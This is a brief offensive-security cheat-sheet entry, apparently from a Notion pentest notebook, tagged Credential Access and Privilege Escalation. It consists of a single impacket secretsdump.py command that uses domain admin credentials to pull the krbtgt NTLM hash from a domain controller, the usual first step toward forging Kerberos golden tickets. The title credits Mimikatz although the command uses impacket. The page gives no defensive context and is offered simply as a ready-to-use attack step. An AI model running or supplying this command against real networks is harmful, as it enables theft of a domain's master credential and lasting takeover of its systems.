# Get KRBTGT NTLM Hash: Mimikatz

OS: Active_Directory, Windows
Description: Get KRBTGT NTLM Hash: Mimikatz
Security Domains: Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21), Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), impacket (https://www.notion.so/impacket-1444c8e523768059ab69ddf37318b307?pvs=21), mimikatz (https://www.notion.so/mimikatz-1464c8e5237680df8de9d1588f8d4980?pvs=21)

```jsx
secretsdump.py TargetDomain.local/Some_Domain_Admin@172.16.5.240 -just-dc-user TargetDomain/krbtgt
```